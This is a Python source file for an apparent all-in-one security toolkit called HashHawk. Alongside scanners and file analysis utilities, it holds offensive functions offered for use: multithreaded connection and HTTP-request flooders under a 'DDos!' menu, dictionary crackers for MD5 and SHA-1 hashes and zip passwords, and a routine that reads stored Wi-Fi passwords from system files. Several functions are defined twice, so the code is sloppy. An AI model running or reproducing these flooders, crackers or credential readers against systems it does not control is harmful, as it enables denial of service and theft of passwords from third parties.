import re
import sys
import httpx
from tqdm import tqdm
from termcolor import colored
import requests
from bs4 import BeautifulSoup
import socket
import phonenumbers
from phonenumbers import geocoder, carrier
from utils.main import PASSWORD_COLOR, zip_file, bruteforce_zip
import pefile
import hashlib
import dns.resolver
import os
import json
import pyshark
from threading import Thread
import threading
from concurrent.futures import ThreadPoolExecutor
import time



ART_COLOR = 'blue'
cancel_flag = False  # Flag to handle cancellation

def check_for_updates():
    try:
        print("Fetching remote version...")
        r = requests.get("https://raw.githubusercontent.com/DwrldDev/HashHawk/main/version.txt")
        r.raise_for_status()  # Raise an error if the HTTP request fails
        remote_version = r.text.strip()
        print("Remote version fetched:", remote_version)

        if os.path.exists('version.txt'):
            print("Local version file found.")
            with open('version.txt', 'r') as file:
                local_version = file.read().strip()
                print("Local version read:", local_version)
                if remote_version != local_version:
                    print("A new version is available. Please download the latest version from GitHub.")
                    time.sleep(3)
                    sys.exit()  # Exit the script with a non-zero status code
                else:
                    print("You are using the latest version.")
                    return True
        else:
            print("Local version file not found.")
            return False

    except requests.RequestException as e:
        print(f"Failed to fetch the remote version: {e}")
        return True  # Assuming the check should pass to avoid blocking the program on network failure

    except IOError as e:
        print(f"Error accessing local version file: {e}")
        return True  # Assuming the check should pass if there's an issue with the local file

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return True  # Any other unexpected error, assuming the check should pass to avoid blocking the program

# Call the function
check_for_updates()

def get_user_input():
    target = input("Enter the target domain (e.g., http://127.0.0.1:5000/): ").strip()
    wordlist = input("Enter the wordlist file name: ").strip()
    thread = int(input("Enter the number of threads (default is 10): ") or "10")
    ext_file = input("Enter the file name containing extensions: ").strip()

    return target, wordlist, thread, ext_file

def read_extensions(ext_file):
    try:
        with open(ext_file, 'r') as file:
            extensions = file.read().strip().split(',')
            return extensions
    except FileNotFoundError:
        print(f"Extensions file '{ext_file}' not found.")
        return []

def print_info(target, wordlist, lines, thread, ext):
    print("Info: ")
    print(f"Target: {target}")
    print(f"File: {wordlist}")
    print(f"Length: {lines}")
    print(f"Thread: {thread}")
    print(f"Extension: {ext}\n")
    print("Start Searching:\n")



def test_directory(target, ext, url):
    global cancel_flag
    try:
        if not cancel_flag:
            link = target + url
            req = requests.head(link)
            status = req.status_code

            if status == 200:
                print(colored(f"[+] Found: " + f"{link}",'green'))
            elif status == 301 or status == 302:
                redirect_link = req.headers['Location']
                print(colored(f"[*] Redirect From: " + f"{link}" + f" -> {redirect_link}",'blue'))
    except requests.RequestException:
        pass

def cancel_scan():
    global cancel_flag
    input("Press Enter to cancel the scan: ")
    cancel_flag = True
    print("\nCanceling scan...")

def directory():
    global cancel_flag
    try:
        target, wordlist, thread, ext_file = get_user_input()
        target = target if target.startswith("http") else f"http://{target}"
        target = target if target.endswith("/") else f"{target}/"
        extensions = read_extensions(ext_file)
        ext = extensions if extensions else [""]

        lines = len(open(wordlist).readlines())
        print_info(target, wordlist, lines, thread, ext)

        cancel_thread = threading.Thread(target=cancel_scan)
        cancel_thread.start()

        start = time.time()
        with open(wordlist, 'r') as urls:
            with ThreadPoolExecutor(max_workers=thread) as exe:
                futures = []
                for url in urls:
                    url = url.strip()
                    if cancel_flag:
                        break
                    futures.append(exe.submit(test_directory, target, ext, url))

                for future in futures:
                    if cancel_flag:
                        break
                    future.result()  # To propagate exceptions

        took = (time.time() - start) / 60
        print(f"Took: {took} m{' ' * 26}\n")
    except Exception as e:
        print(f"#Error: {e}")
        sys.exit(1)
    finally:
        cancel_flag = True  # Ensure the flag is set to True when exiting the program
        cancel_thread.join()  # Wait for the cancel thread to finish



def syn_flood(target_ip, target_port):
    global cancel_flag
    while not cancel_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b'SYN')
            s.close()
            print(f"\nSent attack to {target_ip}:{target_port} - Successful")
        except socket.error as e:
            print(f"\nSent attack to {target_ip}:{target_port} - Failed")
            time.sleep(1)  # Adjust sleep time as needed to control the rate of SYN packets



def start_threads(num_threads, target_ip, target_port):
    global cancel_flag
    cancel_thread = threading.Thread(target=cancel_scan)
    cancel_thread.start()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port: "))
    num_threads = int(input("Enter number of threads: "))

    start_threads(num_threads, target_ip, target_port)




def attack(ip, port):
    global cancel_flag
    while not cancel_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # Increased timeout to 5 seconds
            sock.connect((ip, port))
            sock.sendall(b'GET / HTTP/1.1\r\n')
            sock.sendall(f'Host: {ip}\r\n\r\n'.encode())
            sock.close()
            print(f"\nSent attack to {ip}:{port} - Successful")
        except socket.error as e:
            print(f"\nSent attack to {ip}:{port} - Failed")

def cancel_scan():
    global cancel_flag
    input("Press Enter to cancel the attack: ")
    cancel_flag = True
    print("\nCanceling attack...")

def main():
    ip = input('Enter the IP: ')
    port = int(input('Enter the port: '))
    threads = int(input('Enter the number of threads: '))

    cancel_thread = Thread(target=cancel_scan)
    cancel_thread.start()

    attack_threads = []
    for i in range(threads):
        t = Thread(target=attack, args=(ip, port))
        t.start()
        attack_threads.append(t)

    for t in attack_threads:
        t.join()


def check_clickjacking(url):
    try:
        response = requests.get(url)

        # Check if the page has X-Frame-Options header
        if 'X-Frame-Options' in response.headers:
            x_frame_options = response.headers['X-Frame-Options']
            if x_frame_options != 'DENY' and x_frame_options != 'SAMEORIGIN':
                print(colored(f"{url} might be vulnerable to clickjacking (X-Frame-Options: {x_frame_options}))",'yellow'))
            else:
                print(colored(f"{url} is protected against clickjacking (X-Frame-Options: {x_frame_options})",'green'))
        else:
            print(colored(f"{url} might be vulnerable to clickjacking (X-Frame-Options header is missing)",'yellow'))

    except requests.RequestException as e:
        print(f"Error: {e}")


def check_service(service, port, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Adjust timeout as needed
        sock.connect((host, port))
        print(colored(f"{service} is running on port {port}",'green'))
        sock.close()
    except socket.error:
        print(colored(f"{service} is not running on port {port}",'red'))

def check_custom_services():
    custom_services = {}
    print("Enter custom services and ports. Type 'done' to scan all")
    while True:
        service = input("Enter service name (or 'done' to finish): ")
        if service.lower() == 'done':
            break
        port = int(input(f"Enter port for {service}: "))
        custom_services[service] = port
    return custom_services    



def read_services_from_json(file_path):
    with open(file_path, 'r') as file:
        return json.load(file)

def returnBanner(ip, port):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner
    except Exception as e:
        return b''

def main_banner():
    ip = input("[*] Enter Target IP to Scan: ")
    
    # Read services from JSON file
    services = read_services_from_json('services.json')
    
    for service, port in services.items():
        banner = returnBanner(ip, port)
        if banner:
            try:
                decoded_banner = banner.decode('utf-8').strip()
            except UnicodeDecodeError:
                decoded_banner = "Cannot decode the data"
            print(colored(f"[*] {ip}:{port} ({service}) - {decoded_banner}",'green'))




def get_wifi_passwords():
    wifi_directory = '/etc/NetworkManager/system-connections/'
    wifi_info = {}

    # Check if the directory exists
    if not os.path.isdir(wifi_directory):
        return "Directory not found"

    # List all files in the directory
    files = os.listdir(wifi_directory)

    # Iterate through each file in the directory
    for file in files:
        file_path = os.path.join(wifi_directory, file)

        # Check if the item is a file (not a directory)
        if os.path.isfile(file_path):
            # Read the file content
            with open(file_path, 'r') as f:
                lines = f.readlines()

                # Find the SSID and PSK in the file content
                ssid = None
                psk = None

                for line in lines:
                    if line.startswith('ssid='):
                        ssid = line.strip().split('=')[1]
                    elif line.startswith('psk='):
                        psk = line.strip().split('=')[1]

                # Store SSID and PSK in the dictionary
                if ssid and psk:
                    wifi_info[ssid] = psk

    return wifi_info


def check_service(service, port, host):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Adjust timeout as needed
        sock.connect((host, port))
        print(colored(f"{service} is running on port {port}",'green'))
        sock.close()
    except socket.error:
        print(colored(f"{service} is not running on port {port}",'red'))

def check_custom_services(host):
    custom_services = {}
    print("Enter custom services and ports. Type 'done' to scan all")
    while True:
        service = input("Enter service name (or 'done' to finish): ")
        if service.lower() == 'done':
            break
        port = int(input(f"Enter port for {service}: "))
        custom_services[service] = port
    return custom_services



def check_security_headers(url):
    try:
        response = requests.get(url)
        
        print(colored(f"Security headers for: {url}",'green'))
        print(colored(f"-----------------------------------------",'green'))

        # Checking for common security headers
        headers_to_check = [
            "Strict-Transport-Security",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Content-Security-Policy",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "Feature-Policy",
            "Expect-CT"
        ]

        for header in headers_to_check:
            if header in response.headers:
                print(colored(f"{header}: {response.headers[header]}",'green'))
            else:
                print(colored(f"{header} Not found",'red'))

    except requests.RequestException as e:
        print(colored(f"An error occurred: {e}",'red'))

def web_vulnerability_scan(target_url):
    try:
        # Send an HTTP GET request to the target URL
        response = requests.get(target_url)

        # Check the HTTP status code to see if the request was successful
        if response.status_code == 200:
            # Parse the HTML content of the page
            soup = BeautifulSoup(response.text, 'html.parser')

            # Initialize a flag to track if any vulnerabilities are found
            vulnerabilities_found = False

            # Example: Check for the presence of common SQL injection keywords
            if re.search(r'\b(union|select|from)\b', soup.text, re.IGNORECASE):
                print(colored(f"Potential SQL Injection vulnerability found.",'green'))
                vulnerabilities_found = True

            # Example: Check for the presence of common XSS keywords
            if re.search(r'<script|javascript:', soup.text, re.IGNORECASE):
                print(colored(f"Potential Cross-Site Scripting (XSS) vulnerability found.",'green'))
                vulnerabilities_found = True

            # Example: Check for potential iFrame injection
            if re.search(r'<iframe', soup.text, re.IGNORECASE):
                print(colored(f"Potential iFrame Injection vulnerability found.",'green'))
                vulnerabilities_found = True

            # Add more checks for other vulnerabilities as needed
            # Example: Check for OS command injection
            if re.search(r'&|\||;|\$|`', soup.text):
                print(colored(f"Potential OS Command Injection vulnerability found.",'green'))
                vulnerabilities_found = True

            # Example: Check for PHP code injection
            if re.search(r'<?php|<\?|<%|<%=', soup.text):
                print(colored(f"Potential PHP Code Injection vulnerability found.",'green'))
                vulnerabilities_found = True

            # Example: Check for XML injection
            if re.search(r'<\?xml', soup.text):
                print(colored(f"Potential XML Injection vulnerability found.",'red'))
                vulnerabilities_found = True

            # Add checks for other vulnerabilities here

            # If no vulnerabilities were found, print a message
            if not vulnerabilities_found:
                print(colored(f"No vulnerabilities found on this website.",'red'))

        else:
            print(colored(f"Failed to retrieve the page. Status code: {response.status_code}",'red'))
    except requests.exceptions.RequestException as e:
        print(colored(f"An error occurred while fetching the page: {str(e)}",'red'))
        

def check_dns_records(domain):
    try:
        # A record lookup
        a_records = dns.resolver.resolve(domain, 'A')
        print(f"A records for {domain}:")
        for record in a_records:
            print(colored(str(record), 'green'))  # Print A records in green

        # TXT record lookup
        txt_records = dns.resolver.resolve(domain, 'TXT')
        print(f"TXT records for {domain}:")
        for record in txt_records:
            print(colored(str(record), 'green'))  # Print A records in green

        # CNAME record lookup
        cname_records = dns.resolver.resolve(domain, 'CNAME')
        print(f"CNAME records for {domain}:")
        for record in cname_records:
            print(colored(str(record), 'green'))  # Print A records in green

    except dns.resolver.NoAnswer:
        print(colored(f"No DNS records found for {domain}",'red'))
    except dns.resolver.NXDOMAIN:
        print(colored(f"The domain {domain}does not exist",'red'))
    except Exception as e:
        print(colored(f"An error occurred: {e}",'red'))

def crack_sha1_hash(hash_to_crack, password_list):
        total_passwords = len(password_list)
        print(f"Cracking {total_passwords} passwords...")

    # Create tqdm progress bar
        progress_bar = tqdm(password_list, desc="Cracking Progress", ascii=True)

        for password in progress_bar:
            hashed_password = hashlib.sha1(password.encode()).hexdigest()
            if hashed_password == hash_to_crack:
                progress_bar.close()  # Close the progress bar
                print(f"\nPassword is: {password}")
                return password

        print("\nPassword not found in the list.")
        progress_bar.close()  # Close the progress bar
        return None

def crack_password(hash_to_crack, password_list):
    total_passwords = len(password_list)
    print(f"Cracking {total_passwords} passwords...")

    # Create tqdm progress bar
    progress_bar = tqdm(password_list, desc="Cracking Progress", ascii=True)

    for password in progress_bar:
        # Calculate the MD5 hash of the password
        hashed_password = hashlib.md5(password.encode()).hexdigest()

        if hashed_password == hash_to_crack:
            progress_bar.close()  # Close the progress bar
            return password

    print("\nPassword not found in the list.")
    progress_bar.close()  # Close the progress bar
    return None

def analyze_exe(exe_path):
    try:
        # Open the executable file using pefile
        pe = pefile.PE(exe_path)

        # Print some basic information about the PE file
        print(f"File: {exe_path}")
        print(f"ImageBase: 0x{pe.OPTIONAL_HEADER.ImageBase:08X}")
        print(f"Number of Sections: {pe.FILE_HEADER.NumberOfSections}")
        print(f"EntryPoint: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:08X}")

        # List all the sections in the PE file
        print("\nSections:")
        for section in pe.sections:
            print(f"Name: {{section.Name.decode().rstrip('\x00')}}")
            print(f"Virtual Address: 0x{section.VirtualAddress:08X}")
            print(f"Size of Raw Data: {section.SizeOfRawData} bytes")
            print(f"Characteristics: 0x{section.Characteristics:08X}")
            print()

        # Close the PE file
        pe.close()

    except pefile.PEFormatError as e:
        print(f"Error: {e}")


def hex_viewer_for_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
        return

    # Define the number of bytes per line and initialize line counter
    bytes_per_line = 16
    line_counter = 0

    for i in range(0, len(data), bytes_per_line):
        hex_bytes = data[i:i + bytes_per_line]
        hex_string = ' '.join([f'{byte:02X}' for byte in hex_bytes])
        ascii_string = ''.join([chr(byte) if 32 <= byte <= 126 else '.' for byte in hex_bytes])

        print(f'{line_counter * bytes_per_line:08X}  {hex_string.ljust(48)}  {ascii_string}')
        line_counter += 1


def extract_strings_from_file(file_path, min_length=4):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
        return

    string_list = []

    current_string = ''
    for byte in data:
        # Check if the byte represents an ASCII character
        if 32 <= byte <= 126:
            current_string += chr(byte)
        else:
            if len(current_string) >= min_length:
                string_list.append(current_string)
            current_string = ''

    # Add the last string in case the file doesn't end with a non-ASCII character
    if len(current_string) >= min_length:
        string_list.append(current_string)

    return string_list


def get_phone_info(phone_number_str):
    try:
        # Parse the phone number
        phone_number = phonenumbers.parse(phone_number_str)

        # Check if the phone number is valid
        if not phonenumbers.is_valid_number(phone_number):
            return "Invalid phone number"

        # Get the region (e.g., state) associated with the phone number
        region = geocoder.description_for_number(phone_number, "en")

        # Get the country associated with the phone number
        country = geocoder.country_name_for_number(phone_number, "en")

        # Get the carrier information (if available)
        carrier_info = carrier.name_for_number(phone_number, "en")

        # Format the results
        result = {
            "Phone Number": phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
            "Country": country,
        }

        if carrier_info:
            result["Carrier"] = carrier_info

        return result
    except phonenumbers.phonenumberutil.NumberParseException:
        return "Invalid phone number format"


def scan_ports(target_host, ports):
    open_ports = []

    for port in ports:
        try:
            # Create a socket object
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Set a timeout for the connection attempt (adjust as needed)
            socket.setdefaulttimeout(1)

            # Attempt to connect to the target on the current port
            result = client_socket.connect_ex((target_host, port))

            # If the connection was successful, the port is open
            if result == 0:
                open_ports.append(port)
                client_socket.close()
        except socket.error:
            return 'Something wrong, check the ip is correct'
    return open_ports




def get_md5_hash(file_path):
    md5_hash = hashlib.md5()
    with open(file_path, 'rb') as f:
        # Read the file in chunks to avoid loading the whole file into memory
        for chunk in iter(lambda: f.read(4096), b''):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def generate_md5_hash(input_string):
    # Encode the input string to bytes before hashing
    encoded_string = input_string.encode('utf-8')
    
    # Create an MD5 hash object
    md5_hash = hashlib.md5()
    
    # Update the hash object with the encoded string
    md5_hash.update(encoded_string)
    
    # Get the hexadecimal representation of the hash
    hashed_string = md5_hash.hexdigest()
    
    return hashed_string


def generate_sha1_hash(input_string):
    # Encode the input string to bytes before hashing
    encoded_string = input_string.encode('utf-8')
    
    # Create an MD5 hash object
    sha1_hash = hashlib.sha1()
    
    # Update the hash object with the encoded string
    sha1_hash.update(encoded_string)
    
    # Get the hexadecimal representation of the hash
    hashed_string = sha1_hash.hexdigest()
    
    return hashed_string

def identify_hash_type(hash_value):
    if len(hash_value) == 32 and re.match(r'^[0-9a-fA-F]+$', hash_value):
        return "MD5"
    elif len(hash_value) == 40 and re.match(r'^[0-9a-fA-F]+$', hash_value):
        return "SHA-1"
    elif len(hash_value) == 64 and re.match(r'^[0-9a-fA-F]+$', hash_value):
        return "SHA-256"
    elif len(hash_value) == 60 and hash_value.startswith('$2a$'):
        return "BCrypt"
    elif len(hash_value) == 34 and hash_value.startswith('$1$'):
        return "MD5-Crypt"
    else:
        return "Unknown"


def network_info(ip_address) -> list:
    ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
    req = httpx.get(f"https://ipinfo.io/{ip_address}/json")
    if req.status_code == 200:
        data = req.json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        loc = data.get('loc')
        googlemap = f"https://www.google.com/maps/search/?api=1&query={loc}"
    return [ip, city, country, region, org, loc, googlemap]


def reverse_engineering_menu():
    while True:
        print("\nReverse Engineering Menu:")
        print(colored("1. Patch reversing(strings from exe)", "blue"))
        print(colored("2. Hex Dump", "blue"))
        print(colored("3. Analyze Exe", "blue"))
        print(colored("4. Back to Main Menu", "blue"))

        reverse_choice = input("Enter your choice (1-4): ")

        
        if reverse_choice == "1":
            file_path = input("Enter the path: ")
            extracted_strings = extract_strings_from_file(file_path, min_length=4)

            if extracted_strings:
                print("Extracted Strings:")
                for string in extracted_strings:
                    print(string)
            else:
                print("No strings found in the specified file.")

        elif reverse_choice == "2":
            file_path = input("Enter the path: ")
            hex_viewer_for_file(file_path)
        elif reverse_choice == "3":
            exe_file_path = input("Enter the path: ")
            analyze_exe(exe_file_path)

        elif reverse_choice == "4":
            break
        else:
            print("Invalid choice. Please select again.")


def network_info_menu():
    while True:
        print("\nNetwork Info Menu:")
        print(colored("1. IP Info", "blue"))
        print(colored("2. Wifi Passwords(Admin privs)", "blue"))
        print(colored("3. DNS Lookup", "blue"))
        print(colored("4. Analyze Packets", "blue"))
        print(colored("5. Back to Main Menu", "blue"))

        network_choice = input("Enter your choice (1-5): ")

        if network_choice == "1":
            ip_address = input("Enter an IP address: ")
            info = network_info(ip_address)
            print("IP:", info[0])
            print("City:", info[1])
            print("Country:", info[2])
            print("Region:", info[3])
            print("Organization:", info[4])
            print("Location:", info[5])
            print("Google Maps:", info[6])
        elif network_choice == "2":

            wifi_networks = get_wifi_passwords()

# Display SSID and PSK for each Wi-Fi network
            for ssid, psk in wifi_networks.items():
                print(colored(f"SSID: {ssid}, PSK: {psk}",'green'))
                
        elif network_choice == "3":
            domain_to_check = input("Enter the domain to check DNS records: ")
            check_dns_records(domain_to_check)

        elif network_choice == "4":
            print("'Ethernet' for example")
            name = input("Enter interface here: ")
# Capture packets on interface 'Ethernet' for example
            capture = pyshark.LiveCapture(interface=name)

# Sniff packets and print a summary
            for packet in capture.sniff_continuously(packet_count=10):
                print(packet)

        elif network_choice == "5":
            break  # Go back to the main menu
        else:
            print("Invalid choice. Please select again.")


def scan_menu():

    while True:
        print("\nScans Menu:")
        print(colored("1. Port Scanner", "blue"))
        print(colored("2. Port Service Runner", "blue"))
        print(colored("3. Banner Grab scaan", "blue"))
        print(colored("4. ClickJack scan", "blue"))
        print(colored("5. Directory Brutforce", "blue"))
        print(colored("6. Phone Number Scan", "blue"))
        print(colored("7. SQL/XSS Vuln Scanner", "blue"))
        print(colored("8. SecurityHeader Scan", "blue"))
        print(colored("9. Back to Main Menu", "blue"))

        scan_choice = input("Enter your choice (1-9): ")

        if scan_choice == "1":
            target_host = input("Enter the target host or IP address: ")
            print("Performing the port scan, Please be patient.")
            ports = range(1, 25)  # Change the range of ports to scan

            open_ports = scan_ports(target_host, ports)

            if open_ports:
                print("Open ports:")
                for port in open_ports:
                    print(f"Port {port}")
            else:
                print("No open ports found on the target.")
        elif scan_choice == "2":
                        # Read services from JSON file
            try:
                services = read_services_from_json('services.json')
            except FileNotFoundError:
                print("Error: File 'services.json' not found.")
                continue  # Restart the loop to allow re-entry of choice
            
            host = input("Enter the host name or IP address: ")
            custom_services = check_custom_services(host)

            for service, port in services.items():
                check_service(service, port, host)

            for service, port in custom_services.items():
                check_service(service, port, host)
            break  # Exit loop after successful completion
        elif scan_choice == "3":
            main_banner()
        elif scan_choice == "4":
# List of URLs to scan for clickjacking vulnerability
            urls_to_scan = input("Enter URLs to scan (separated by spaces): ")

# Split the input string of URLs into a list
            urls_list = urls_to_scan.split()

# Scan each URL for clickjacking vulnerability
            for url in urls_list:
                check_clickjacking(url)
        elif scan_choice == "5":
                directory()  # Call directory function

        elif scan_choice == "6":
            phone_number = input("Enter a phone number (with country code(+44)): ")
            phone_info = get_phone_info(phone_number)

            if isinstance(phone_info, dict):
                print(colored("Phone Number Information:",'green'))
                for key, value in phone_info.items():
                    print(colored(f"{key}: {value}",'green'))
            else:
                print(phone_info)



        elif scan_choice == "7":
            target_url = input("Enter the URL to scan: ")
            web_vulnerability_scan(target_url)

        elif scan_choice == "8":
            website_url = input("Enter the website URL to check security headers: ")
            check_security_headers(website_url)
        elif scan_choice == "9":
            break  # Go back to the main menu
        else:
            print("Invalid choice. Please select again.")


def zip_menu():
    while True:
        print("\nZip File Menu:")
        print(colored("1. Password a Zipfile", "blue"))
        print(colored("2. Bruteforce Zip", "blue"))
        print(colored("3. Back to Main Menu", "blue"))

        zip_choice = input("Enter your choice (1-3): ")

        if zip_choice == "1":
            zip_file()
        elif zip_choice == "2":
            bruteforce_zip()
        elif zip_choice == "3":
            break  # Go back to the main menu
        else:
            print("Invalid choice. Please select again.")

def ddos_menu():
    while True:
        print("\nDDos Menu:")
        print(colored("1. LocalHost Killer", "blue"))
        print(colored("2. Syn Flood", "blue"))
        print(colored("3. Back to Main Menu", "blue"))


        ddos_choice = input("Enter your choice (1-3):")

        if ddos_choice == '1':
            ip = input('Enter the IP: ')
            port = int(input('Enter the port: '))
            threads = int(input('Enter the number of threads: '))

            cancel_thread = Thread(target=cancel_scan)
            cancel_thread.start()

            attack_threads = []
            for i in range(threads):
                t = Thread(target=attack, args=(ip, port))
                t.start()
                attack_threads.append(t)

            for t in attack_threads:
                t.join()
        elif ddos_choice == '2':
            main()
        elif ddos_choice == '3':
            break

def cracking_menu():
    while True:
        print("\nPassword Cracking Menu:")
        print(colored("1. MD5 Cracker", "blue"))
        print(colored("2. SHA-1 Cracker", "blue"))
        print(colored("3. Hash Analyzer", "blue"))
        print(colored("4. SHA-1 Generator", "blue"))
        print(colored("5. MD5 Generator", "blue"))
        print(colored("6. ZipFile Md5 Checker", "blue"))
        print(colored("7. Back to Main Menu", "blue"))

        zip_choice = input("Enter your choice (1-7): ")

        if zip_choice == "1":
            hash_to_crack = input("Enter the hash you want to crack: ")

    # Ask the user for the path to their custom password list file
            custom_password_list_file = input("Enter the path to your custom password list file: ")

    # Read passwords from the custom password list file
            try:
                with open(custom_password_list_file, "r", encoding="latin-1") as f:
                    password_list = [line.strip() for line in f]
            except FileNotFoundError:
                print(f"File '{custom_password_list_file}' not found.")
                continue

            hash_type = "MD5"  # Specify MD5 directly

            try:
                hashed_password = crack_password(hash_to_crack, password_list)

                if hashed_password:
                    print(f"The cracked password is: {colored(hashed_password, PASSWORD_COLOR)}")
                else:
                    print("Password not found in the list.")
            except ValueError:
                print("Invalid hash format.")


        if zip_choice == "2":
            hash_to_crack = input("Enter the SHA-1 hash you want to crack: ")

    # Ask the user for the path to their custom password list file
            custom_password_list_file = input("Enter the path to your custom password list file: ")

    # Read passwords from the custom password list file
            try:
                with open(custom_password_list_file, "r", encoding="latin-1") as f:
                    password_list = [line.strip() for line in f]
            except FileNotFoundError:
                print(f"File '{custom_password_list_file}' not found.")
                continue

    # Call the SHA-1 cracking function
            cracked_password = crack_sha1_hash(hash_to_crack, password_list)

            if cracked_password:
                print(f"The cracked password is: {colored(cracked_password, PASSWORD_COLOR)}")
            else:
                print("Password not found in the list.")


        elif zip_choice == "3":
            hash_value = input("Enter the hash value: ")
            hash_type = identify_hash_type(hash_value)
            print(f"Hash: {hash_value} => Type: {hash_type}")


        elif zip_choice == "4":
            input_string = input("Enter String Here: ")
            sha1_hash = generate_sha1_hash(input_string)
            print("sha1 Hash:", sha1_hash)
        elif zip_choice == "5":
            input_string = input("Enter String Here: ")
            md5_hash = generate_md5_hash(input_string)
            print("MD5 Hash:", md5_hash)
        elif zip_choice == "6":
            file_path = input('Enter the Path to zipfile: ')
            md5 = get_md5_hash(file_path)
            print(md5)
        elif zip_choice == "7":
            break


def main_menu():
    while True:
        ART_COLOR = "blue"
        art = colored('''                                        
 ██░ ██  ▄▄▄        ██████  ██░ ██  ██░ ██  ▄▄▄       █     █░██ ▄█▀
▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▓██░ ██▒▒████▄    ▓█░ █ ░█░██▄█▒ 
▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██▀▀██░▒██  ▀█▄  ▒█░ █ ░█▓███▄░ 
░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ░▓█ ░██ ░██▄▄▄▄██ ░█░ █ ░█▓██ █▄ 
░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░▓█▒░██▓ ▓█   ▓██▒░░██▒██▓▒██▒ █▄
 ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▓░▒ ▒ ▒ ▒▒ ▓▒
 ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ▒ ░ ░ ░ ░▒ ▒░
 ░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░ ░  ░░ ░  ░   ▒     ░   ░ ░ ░░ ░ 
 ░  ░  ░      ░  ░      ░   ░  ░  ░ ░  ░  ░      ░  ░    ░   ░  ░                                                                   
    Welcome to HashHawk Cracker and Analyzer!
                  Author: Raxz
                  Website: https://itsraxz.co.uk
    ''', ART_COLOR)
        print(art)

        try:
            print("\nSelect an option:")
            options = [
                colored("[1] Reverse Engineering", "blue"),
                colored("[2] Network Info", "blue"),
                colored("[3] Scans", "blue"),
                colored("[4] Zip File", "blue"),
                colored("[5] Password Cracking", "blue"),
                colored("[6] DDos!", "blue"),
                colored("[7] Exit!", "blue"),
            ]

            for option in options:
                print(option)

            choice = input("Enter your choice (1-7): ")

            if choice == "1":
                reverse_engineering_menu()
            elif choice == "2":
                network_info_menu()
            elif choice == "3":
                scan_menu()
            elif choice == "4":
                zip_menu()
            elif choice == "5":
                cracking_menu()
            elif choice == "6":
                ddos_menu()

            elif choice == "7":
                print("Exiting the program.")
                break
            else:
                print("Invalid choice. Please select again.")
        except KeyboardInterrupt:
            user_response = input("\nDo you want to exit? (yes/no): ").strip().lower()
            if user_response == "yes":
                print("Exiting the program.")
                sys.exit(0)
            else:
                print("Resuming the menu.\n")

if __name__ == "__main__":
    
    main_menu()
